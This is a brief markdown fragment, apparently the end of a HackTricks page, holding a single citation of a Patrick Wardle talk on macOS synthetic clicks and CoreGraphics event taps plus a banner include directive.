- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
